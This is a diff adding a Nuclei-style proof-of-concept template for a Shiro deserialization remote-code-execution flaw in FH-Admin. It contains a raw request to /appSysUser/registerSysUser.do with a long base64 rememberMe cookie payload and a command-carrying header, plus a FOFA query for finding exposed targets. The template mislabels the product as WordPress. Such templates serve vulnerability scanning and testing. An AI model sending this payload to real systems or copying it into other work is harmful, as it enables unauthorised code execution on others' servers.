@@ -1,0 +1,27 @@
+id: poc-nptmgu72vs5n3385
+info:
+  name: Wordpress FH Admin registerSysUser.do shiro反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nptmgu72vs5n3385'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nptmgu72vs5n3385
+    fofa: app="FH-Admin"
+http:
+- raw:
+  - 'GET /appSysUser/registerSysUser.do HTTP/1.1
+
+
+    X-Token-Data: echo dudesuite
+
+
+
+
+    Cookie: rememberMe=RjI4NWNFQzBDZTVGNWNBM6ByNoG5jvpzbQqTkz2zP8GLkE05HSQI3cfp4VAgaPDcrRrjkpJu9jMhqPwCVC7PctiZQKqpVMs1MpWDU+QNSulwceEdncBKO8H/3euOC5R6IBRFUreexKBsk+q2p7+J2TyahI2qYdizpzKnXhigkLx8wSmLCPHjJN/Mnhd3mepbIPPthxHC3BHq5+hda3bKpoEr4dv2jKzCJj3h+8skALnTGmbUyoWmobwsTLoBkI6G/MsFi3oiXxzzc+kEi7FNaxxwy2aoMh8YYZL9nOe6kmjBqBJmZU4oLlLsM9K6jsD075vRV6VheB0a/rT/g1fjZ9N2a7UJso5vRcS1HmjGJuHrjzNYKo88E/1WonnbUr5eD2BrrkaUStNHECgIlrRAG+fjMFlqKrSyLEhS6stopFpi5yY+DQqUOAdcy0bOp8QhscoeQrp7rD9InazRCX1lcaYlCSxfxZ3oHj9uFpHvqANTrIM5szCYjW0tukar6PebStvwrxQOqaKsk5zaUy42mTzfMnb5IbvlihIYdUNhjavs++Bb55tSuluY+qHzm7p4jCSfsGrcTO90+tmU1VG45yGk3YI/fv2S2gxg/Pe7PcPo6ZksfrNMz0pL9vB9rTQwTQopQ690SyqMCBY5RzCHuHxUSFOqHBdJmxyD/xt0qfKhlGIDEoE+QfGaUzdNU/ENm0FV8lawm4l9UiR301oJ9ezwahSAFFEE0mYpB8Sncper1X2odJlw2kttvIK+kmng2B6rck+Sia3uSgLE1gig/MgBS0Z/04NhEGZvJT4mYYZvAoneGlkg0FyzaxgXRX1qhUb5F1lQKAR+cTNJHck3VO9wMrhJH1uBf4Ny66KbHukp3CbYJqBrN+CJo8DO07kUY7myBDjtxGpUnHi4Ysmp2OFKORfBUARIyGQm0sAdy3OQYFWMVRperntlwjAea73I2NiDFwfffyI46ua/aEgtFYhaTNtrlgQO5f6BghyZW/XayJcVC8lHWfatclIeeQKIahmtrTmACWZcL5+mrP2VxOgNTAFMU3oHY+LuOlLi451vTWoQ7skaOXFhQSxURkQnzTwDlV6y/yM9B8ANr8wN0hSawW/5j1N/xJilyT3BobPfK7RWGYUpaUS2717mnv/Las6ysmBdZDF86cXOT1DgU7Z6v/jghABTPOZplvY/v6SAzhi3jDLVei9HA+3pslIxFHMKGgbcOht2ehcZaQj1uD0oScLujfQcFV16a50uEEEzg5ImZ4nfUHs4UukyBXbfbJtZpCee6i/FFJaXm6gIvaUIDR6LT0IkoAD3u0anzulliy4kv2FtkYCQcexZwZcE6StvgcAmLV94e1TtHIOlsxK+yIQMZSttiByhVd1Kk7TtBAqVQP+wN8sq2+Q7+vpLMN7ey3hk0uPxeXkYZLIWfY/RICDihUl1njUiQVu+DFgHsOmxOH+eLdN1Tbo7iRsConErnczr7uhGN2RPwQAAB/NPnmdBIc1G9U7zuBCPOchh6m67sxOMZpO83QDytbLiuITCHhwBCBrL8kG6jGZ16wjDf4Y5jN25twD7bD7JkupPc2k5igreA6I1YDl+sBSHI9T3/OUDIPb2m/Os84W1Bp43iO7IOPAp61U5YMbHvYa2DDOJ5Di2zStednpNnjvFP2jEJK8t5GiqhT5ZB5Yyyy2Y4nk3M2BtA0viMLXEWqRFgNjbolWWsjoNDO+namcHxdWp8CR/WFKNThTGrksv73/heBMzluYiB/V9tikQqVhE1NkCY/0JYsLoJBiYxYBomiZ8ZKI3MSUdhgP2FXuu738R7VutHlsXUB4SDV4GRnL7rFtdJyBx3rlGh5bOt/EikFhx6DqVl/kSgb0P81DIwb2i3oQhX9HR2M789Lpak8xSRWxH'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
